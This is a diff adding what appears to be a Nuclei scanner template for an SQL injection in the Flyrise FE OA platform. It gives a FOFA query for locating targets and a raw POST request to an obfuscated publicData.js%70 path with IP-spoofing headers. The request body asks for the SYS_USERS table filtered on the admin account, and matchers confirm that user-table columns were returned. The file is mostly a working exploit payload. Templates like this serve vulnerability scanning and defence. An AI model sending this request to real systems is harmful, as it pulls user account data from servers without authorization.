@@ -1,0 +1,41 @@
+id: flyrise-fe-publicdata-sqli
+
+info:
+  name: 飞企互联 OA publicData sql注入漏洞
+  author: qwtd
+  severity: high
+  description: |
+    FOFA: "flyrise.stopBackspace.js"
+  tags: 飞企互联-FE业务协作平台
+
+http:
+  - raw:
+      - |
+        POST /oaerp/ui/common/publicData.js%70 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        X-Forwarded-For: 127.0.0.1
+        X-Originating-IP: 127.0.0.1
+        X-Remote-Addr: 127.0.0.1
+        X-Remote-IP: 127.0.0.1
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+
+        type=getSelectData&table=SYS_USERS&filter=SU01%3D%27admin%27
+    
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "SU00"
+          - "SU01"
+          - "SU02"
+        condition: and
+
+      - type: status
+        status:
+          - 200
+
